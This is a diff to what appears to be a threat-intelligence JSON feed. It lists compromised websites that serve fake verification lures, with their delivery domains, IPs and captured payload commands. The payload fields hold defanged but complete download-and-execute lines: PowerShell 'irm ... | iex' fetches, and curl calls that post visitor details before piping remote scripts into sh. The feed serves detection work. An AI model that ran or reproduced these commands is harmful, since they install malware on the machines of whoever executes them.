@@ -1,5 +1,122 @@
 [
   {
+    "UrlDomain": "luxware.dk",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d8c3e94f491383b9"
+    ],
+    "IP": [
+      "46.30.215.187"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d8c3e94f491383b9')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/d8c3e94f491383b9"
+    ],
+    "ReportId": "cmwydtqb80hum0oml7etj4oca",
+    "ScannedAt": "2026-11-27T02:48:36.713000+00:00"
+  },
+  {
+    "UrlDomain": "officialtrends.unaux.com",
+    "DeliveryUrl": [
+      "cosmical2049.com"
+    ],
+    "PayloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "IP": [
+      "185.27.134.209"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
+    "ResolvedDownloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "ReportId": "cmwydoc7q0hn80omlhpmp4wd9",
+    "ScannedAt": "2026-11-27T02:44:25.256000+00:00"
+  },
+  {
+    "UrlDomain": "www.sbc.edu.cv",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "66.33.215.47"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12"
+    ],
+    "ReportId": "cmwydnli80hkh0oml9je3ct2q",
+    "ScannedAt": "2026-11-27T02:43:50.648000+00:00"
+  },
+  {
+    "UrlDomain": "www.saiadvertisers.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "128.199.31.44"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12"
+    ],
+    "ReportId": "cmwydmynx0hj60omlvef1h679",
+    "ScannedAt": "2026-11-27T02:43:20.986000+00:00"
+  },
+  {
+    "UrlDomain": "newspacecarmecanica.com.br",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "191.6.210.148"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12"
+    ],
+    "ReportId": "cmwydml610hi40oml2u7u3v4n",
+    "ScannedAt": "2026-11-27T02:43:03.507000+00:00"
+  },
+  {
+    "UrlDomain": "selvammotors.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/sw1la1x22k/c06143360118595d"
+    ],
+    "IP": [
+      "77.37.53.160"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/sw1la1x22k/c06143360118595d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/sw1la1x22k/c06143360118595d"
+    ],
+    "ReportId": "cmwydhp3r0ha90oml1nct0d5i",
+    "ScannedAt": "2026-11-27T02:39:15.342000+00:00"
+  },
+  {
     "UrlDomain": "thietbidienanphatvietnam.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -11373,115 +11490,5 @@
     ],
     "ReportId": "cmwljbytb1jwa0omlrmiaavfj",
     "ScannedAt": "2026-11-18T03:01:45.293000+00:00"
-  },
-  {
-    "UrlDomain": "www.islandaireac.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "72.167.205.236"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwlih2x41jki0oml386cqt7o",
-    "ScannedAt": "2026-11-18T02:37:44.413000+00:00"
-  },
-  {
-    "UrlDomain": "bc-aba.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app",
-      "modalelement.classlist.remove",
-      "spinnerelement.style.display"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "141.193.213.10"
-    ],
-    "Related": [
-      {
-        "Value": "https://kiln-bruiyn-ncuas.pro/t.js?site=9ccdccf86455f7c6777775d18c52beeb",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "curl -sL -d \"id=4cadef93-7fcb-4dce-84b4-54cedbcdb9b5&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbc-aba[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T02%3A35%3A33.317Z&lastShellAt=2026-11-18T02%3A35%3A33.317Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwlig0zv1jhr0omlt4lpcr6h",
-    "ScannedAt": "2026-11-18T02:36:55.258000+00:00"
-  },
-  {
-    "UrlDomain": "theeventsmafia.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app",
-      "modalelement.classlist.remove",
-      "spinnerelement.style.display"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "91.108.98.226"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=ae8b66fc-b4e6-4866-91b6-8f4c3fafb9d5&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ftheeventsmafia[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T02%3A35%3A04.554Z&lastShellAt=2026-11-18T02%3A35%3A04.554Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwliffs71jg90omldft1fkjb",
-    "ScannedAt": "2026-11-18T02:36:27.752000+00:00"
-  },
-  {
-    "UrlDomain": "designsbycraigveenker.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "softify.lat",
-      "modalelement.classlist.remove",
-      "spinnerelement.style.display"
-    ],
-    "PayloadUrl": [
-      "https://softify.lat/u/8ecec3ba",
-      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
-      "https://softify.lat/w/8ecec3ba"
-    ],
-    "IP": [
-      "35.188.204.146"
-    ],
-    "Related": [
-      {
-        "Value": "https://kiln-bruiyn-ncuas.pro/t.js?site=9ccdccf86455f7c6777775d18c52beeb",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "curl -sL -d \"id=6fc692d3-95bf-480c-a9c3-de7993c448d8&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdesignsbycraigveenker[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T02%3A34%3A01.951Z&lastShellAt=2026-11-18T02%3A34%3A01.951Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
-      "https://softify.lat/u/8ecec3ba"
-    ],
-    "ReportId": "cmwlie27f1jf00oml3vgpb6ov",
-    "ScannedAt": "2026-11-18T02:35:23.523000+00:00"
   }
 ]
